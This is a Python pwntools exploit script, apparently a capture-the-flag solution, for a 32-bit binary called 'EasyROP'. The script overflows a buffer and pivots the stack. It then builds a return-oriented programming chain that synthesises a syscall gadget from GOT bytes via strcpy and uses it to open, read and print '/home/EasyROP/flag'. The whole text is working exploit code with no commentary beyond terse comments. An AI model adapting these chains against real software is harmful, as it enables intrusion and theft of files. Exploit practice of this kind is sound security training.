#!/usr/bin/python3
from pwn import *

# libc-2.27.so 32bits

strcpy_plt = 0x80484a0
read_plt = 0x8048470

read_got = 0x8049fe0

d0 = 0x804847c
null_buf = 0x804a110

ret = 0x8048432
popal = 0x8048808
pop_pop = 0x804886a
pop_pop_pop = 0x8048869
pop_ebp = 0x804886b
leave_ret = 0x8048575

filename = b'/home/EasyROP/flag\0'
readsize = 500

p = process('./EasyROP')

def send(payload):
    sleep(0.01)
    # raw_input('>')
    p.send(payload)

buf = 0x804a210
size = 0x01010101
payload = p32(ret)*0xb
payload += p32(pop_ebp)
payload += p32(buf+0x24)
payload += p32(0x8048775) # push 0, call read
payload += p32(buf)
payload += p32(size) # back to main, call read(0, buf, size)
assert len(payload) == 0x40
send(payload)

payload = p32(ret)*0x10
assert len(payload) == 0x40
send(payload)

# Now we have a beautiful rop environment
buf2 = buf+0xb00
# copy syscall gadget:
#   __GI___libc_read+0x20: call   DWORD PTR gs:0x10
#   (call __kernel_vsyscall)
rop = flat(
        strcpy_plt, pop_pop, buf+0x200, d0,
        strcpy_plt, pop_pop, buf+0x201, read_got+1,
        strcpy_plt, pop_pop, buf+0x204, null_buf,
        strcpy_plt, pop_pop, buf+0x300, buf+0x200,
        strcpy_plt, pop_pop, buf+0x400, buf+0x200,
        strcpy_plt, pop_pop, buf+0x500, buf+0x200)
rop += flat(
        read_plt, pop_pop_pop, 0, buf+0x208, len(filename),
        read_plt, pop_pop_pop, 0, buf+0x300-0x24, 0x24,
        read_plt, pop_pop_pop, 0, buf+0x300+0x20, 0x24,
        read_plt, pop_pop_pop, 0, buf+0x400-0x24, 0x24,
        read_plt, pop_pop_pop, 0, buf+0x400+0x20, 0x24,
        read_plt, pop_pop_pop, 0, buf+0x500-0x24, 0x24,
        pop_ebp, buf+0x300-0x24-0x4, leave_ret)
fakeecx = buf+0x28+0x4 # make esp point to rop chain
fakeebx = 0x03030303
fakeesi = 0x04040404
fakeedi = 0x05050505
fakeebp = buf2
payload = flat(
        buf - 0x30,
        0x01010101,
        0x01010101,
        0x01010101,
        0x01010101,
        fakeecx,
        fakeebx,
        fakeesi,
        fakeedi,
        fakeebp
        )
payload += rop
send(payload)

# filename
send(filename)

# popal: edi, esi, ebp, skip, 
#        ebx, edx, ecx, eax
# open
rop = flat(
        popal, 
        0, 0, buf, 0,
        buf+0x208, 0, 0, 5
        )
send(rop)

# chain to read
rop = flat(pop_ebp, buf+0x400-0x24-0x4, leave_ret)
send(rop)

# read
rop = flat(
        popal, 
        0, 0, buf, 0,
        3, readsize, buf+0x800, 3
        )
send(rop)

# chain to write
rop = flat(pop_ebp, buf+0x500-0x24-0x4, leave_ret)
send(rop)

# write
rop = flat(
        popal, 
        0, 0, buf, 0,
        1, readsize, buf+0x800, 4
        )
send(rop)

p.interactive()
